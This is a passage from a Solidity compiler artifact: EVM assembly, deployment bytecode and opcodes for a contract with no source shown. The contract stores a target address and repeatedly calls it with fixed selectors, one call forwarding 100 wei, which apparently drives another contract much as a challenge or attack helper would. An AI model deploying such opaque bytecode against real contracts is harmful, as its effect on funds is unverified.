*/\n    tag_113:\n        /* \"#utility.yul\":4990:4997   */\n      0x00\n        /* \"#utility.yul\":5019:5024   */\n      dup2\n        /* \"#utility.yul\":5008:5024   */\n      swap1\n      pop\n        /* \"#utility.yul\":4953:5030   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5036:5194   */\n    tag_114:\n        /* \"#utility.yul\":5094:5103   */\n      0x00\n        /* \"#utility.yul\":5127:5188   */\n      tag_166\n        /* \"#utility.yul\":5145:5187   */\n      tag_167\n        /* \"#utility.yul\":5154:5186   */\n      tag_168\n        /* \"#utility.yul\":5180:5185   */\n      dup5\n        /* \"#utility.yul\":5154:5186   */\n      tag_112\n      jump\t// in\n    tag_168:\n        /* \"#utility.yul\":5145:5187   */\n      tag_99\n      jump\t// in\n    tag_167:\n        /* \"#utility.yul\":5127:5188   */\n      tag_113\n      jump\t// in\n    tag_166:\n        /* \"#utility.yul\":5114:5188   */\n      swap1\n      pop\n        /* \"#utility.yul\":5036:5194   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5200:5347   */\n    tag_115:\n        /* \"#utility.yul\":5295:5340   */\n      tag_170\n        /* \"#utility.yul\":5334:5339   */\n      dup2\n        /* \"#utility.yul\":5295:5340   */\n      tag_114\n      jump\t// in\n    tag_170:\n        /* \"#utility.yul\":5290:5293   */\n      dup3\n        /* \"#utility.yul\":5283:5341   */\n      mstore\n        /* \"#utility.yul\":5200:5347   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5353:5898   */\n    tag_62:\n        /* \"#utility.yul\":5528:5532   */\n      0x00\n        /* \"#utility.yul\":5566:5568   */\n      0x60\n        /* \"#utility.yul\":5555:5564   */\n      dup3\n        /* \"#utility.yul\":5551:5569   */\n      add\n        /* \"#utility.yul\":5543:5569   */\n      swap1\n      pop\n        /* \"#utility.yul\":5579:5650   */\n      tag_172\n        /* \"#utility.yul\":5647:5648   */\n      0x00\n        /* \"#utility.yul\":5636:5645   */\n      dup4\n        /* \"#utility.yul\":5632:5649   */\n      add\n        /* \"#utility.yul\":5623:5629   */\n      dup7\n        /* \"#utility.yul\":5579:5650   */\n      tag_111\n      jump\t// in\n    tag_172:\n        /* \"#utility.yul\":5660:5740   */\n      tag_173\n        /* \"#utility.yul\":5736:5738   */\n      0x20\n        /* \"#utility.yul\":5725:5734   */\n      dup4\n        /* \"#utility.yul\":5721:5739   */\n      add\n        /* \"#utility.yul\":5712:5718   */\n      dup6\n        /* \"#utility.yul\":5660:5740   */\n      tag_115\n      jump\t// in\n    tag_173:\n        /* \"#utility.yul\":5787:5796   */\n      dup2\n        /* \"#utility.yul\":5781:5785   */\n      dup2\n        /* \"#utility.yul\":5777:5797   */\n      sub\n        /* \"#utility.yul\":5772:5774   */\n      0x40\n        /* \"#utility.yul\":5761:5770   */\n      dup4\n        /* \"#utility.yul\":5757:5775   */\n      add\n        /* \"#utility.yul\":5750:5798   */\n      mstore\n        /* \"#utility.yul\":5815:5891   */\n      tag_174\n        /* \"#utility.yul\":5886:5890   */\n      dup2\n        /* \"#utility.yul\":5877:5883   */\n      dup5\n        /* \"#utility.yul\":5815:5891   */\n      tag_97\n      jump\t// in\n    tag_174:\n        /* \"#utility.yul\":5807:5891   */\n      swap1\n      pop\n        /* \"#utility.yul\":5353:5898   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a14c89e1188773921603b9c4db526faf7613493a0c9caa4b0af5136c873a27b564736f6c63430008150033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610c18380380610c18833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b610b0c8061010c5f395ff3fe608060405260043610610085575f3560e01c8063946644cd11610058578063946644cd146100dd5780639fcec69814610107578063b2b9f26d14610111578063dc5bb9a11461011b578063e48320091461012557610085565b806312a50b251461008957806313b6ae4c14610093578063419efc03146100bd578063522e1177146100c7575b5f80fd5b61009161012f565b005b34801561009e575f80fd5b506100a76101ab565b6040516100b491906108cc565b60405180910390f35b6100c5610235565b005b3480156100d2575f80fd5b506100db610526565b005b3480156100e8575f80fd5b506100f16105a2565b6040516100fe9190610966565b60405180910390f35b61010f6105c5565b005b610119610691565b005b61012361070d565b005b61012d610789565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166319c43a016040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610193575f80fd5b505af11580156101a5573d5f803e3d5ffd5b50505050565b60606040516024016040516020818303038152906040527fe09966a8000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905090565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16606460405161027b906109ac565b5f6040518083038185875af1925050503d805f81146102b5576040519150601f19603f3d011682016040523d82523d5f602084013e6102ba565b606091505b50509050806102fe576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102f590610a1a565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c58a455b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610362575f80fd5b505af1158015610374573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166319c43a016040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156103dc575f80fd5b505af11580156103ee573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf9f23b56040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610456575f80fd5b505af1158015610468573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e0232b425f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff165f6104d06101ab565b6040518463ffffffff1660e01b81526004016104ee93929190610a9a565b5f604051808303815f87803b158015610505575f80fd5b505af1158015610517573d5f803e3d5ffd5b50505050610523610526565b50565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fa391c646040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561058a575f80fd5b505af115801561059c573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16606460405161060b906109ac565b5f6040518083038185875af1925050503d805f8114610645576040519150601f19603f3d011682016040523d82523d5f602084013e61064a565b606091505b505090508061068e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161068590610a1a565b60405180910390fd5b50565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c58a455b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156106f5575f80fd5b505af1158015610707573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf9f23b56040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610771575f80fd5b505af1158015610783573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e0232b425f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff165f6107ed6101ab565b6040518463ffffffff1660e01b815260040161080b93929190610a9a565b5f604051808303815f87803b158015610822575f80fd5b505af1158015610834573d5f803e3d5ffd5b50505050610840610526565b565b5f81519050919050565b5f82825260208201905092915050565b5f5b8381101561087957808201518184015260208101905061085e565b5f8484015250505050565b5f601f19601f8301169050919050565b5f61089e82610842565b6108a8818561084c565b93506108b881856020860161085c565b6108c181610884565b840191505092915050565b5f6020820190508181035f8301526108e48184610894565b905092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61092e610929610924846108ec565b61090b565b6108ec565b9050919050565b5f61093f82610914565b9050919050565b5f61095082610935565b9050919050565b61096081610946565b82525050565b5f6020820190506109795f830184610957565b92915050565b5f81905092915050565b50565b5f6109975f8361097f565b91506109a282610989565b5f82019050919050565b5f6109b68261098c565b9150819050919050565b5f82825260208201905092915050565b7f63616c6c206661696c65640000000000000000000000000000000000000000005f82015250565b5f610a04600b836109c0565b9150610a0f826109d0565b602082019050919050565b5f6020820190508181035f830152610a31816109f8565b9050919050565b5f610a42826108ec565b9050919050565b610a5281610a38565b82525050565b5f819050919050565b5f819050919050565b5f610a84610a7f610a7a84610a58565b61090b565b610a61565b9050919050565b610a9481610a6a565b82525050565b5f606082019050610aad5f830186610a49565b610aba6020830185610a8b565b8181036040830152610acc8184610894565b905094935050505056fea2646970667358221220a14c89e1188773921603b9c4db526faf7613493a0c9caa4b0af5136c873a27b564736f6c63430008150033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xC18 CODESIZE SUB DUP1 PUSH2 0xC18 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xB0C DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x85 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x946644CD GT PUSH2 0x58 JUMPI DUP1 PUSH4 0x946644CD EQ PUSH2 0xDD JUMPI DUP1 PUSH4 0x9FCEC698 EQ PUSH2 0x107 JUMPI DUP1 PUSH4 0xB2B9F26D EQ PUSH2 0x111 JUMPI DUP1 PUSH4 0xDC5BB9A1 EQ PUSH2 0x11B JUMPI DUP1 PUSH4 0xE4832009 EQ PUSH2 0x125 JUMPI PUSH2 0x85 JUMP JUMPDEST DUP1 PUSH4 0x12A50B25 EQ PUSH2 0x89 JUMPI DUP1 PUSH4 0x13B6AE4C EQ PUSH2 0x93 JUMPI DUP1 PUSH4 0x419EFC03 EQ PUSH2 0xBD JUMPI DUP1 PUSH4 0x522E1177 EQ PUSH2 0xC7 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x91 PUSH2 0x12F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xA7 PUSH2 0x1AB JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB4 SWAP2 SWAP1 PUSH2 0x8CC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC5 PUSH2 0x235 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xDB PUSH2 0x526 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xE8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xF1 PUSH2 0x5A2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xFE SWAP2 SWAP1 PUSH2 0x966 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10F PUSH2 0x5C5 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x119 PUSH2 0x691 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x123 PUSH2 0x70D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x12D PUSH2 0x789 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x19C43A01 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x193 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xE09966A800000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x64 PUSH1 0x40 MLOAD PUSH2 0x27B SWAP1 PUSH2 0x9AC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x2B5 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2BA JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x2FE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2F5 SWAP1 PUSH2 0xA1A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC58A455B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x362 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x374 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x19C43A01 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3DC JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3EE JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCF9F23B5 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x456 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x468 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE0232B42 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH0 PUSH2 0x4D0 PUSH2 0x1AB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4EE SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xA9A JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x505 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x517 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH2 0x523 PUSH2 0x526 JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFA391C64 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x58A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x59C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x64 PUSH1 0x40 MLOAD PUSH2 0x60B SWAP1 PUSH2 0x9AC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x645 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x64A JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x68E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x685 SWAP1 PUSH2 0xA1A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC58A455B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x6F5 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x707 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCF9F23B5 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x771 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x783 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE0232B42 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH0 PUSH2 0x7ED PUSH2 0x1AB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x80B SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xA9A JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x822 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x834 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH2 0x840 PUSH2 0x526 JUMP JUMPDEST JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x879 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x85E JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x89E DUP3 PUSH2 0x842 JUMP JUMPDEST PUSH2 0x8A8 DUP2 DUP6 PUSH2 0x84C JUMP JUMPDEST SWAP4 POP PUSH2 0x8B8 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x85C JUMP JUMPDEST PUSH2 0x8C1 DUP2 PUSH2 0x884 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x8E4 DUP2 DUP5 PUSH2 0x894 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x92E PUSH2 0x929 PUSH2 0x924 DUP5 PUSH2 0x8EC JUMP JUMPDEST PUSH2 0x90B JUMP JUMPDEST PUSH2 0x8EC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x93F DUP3 PUSH2 0x914 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x950 DUP3 PUSH2 0x935 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x960 DUP2 PUSH2 0x946 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x979 PUSH0 DUP4 ADD DUP5 PUSH2 0x957 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP 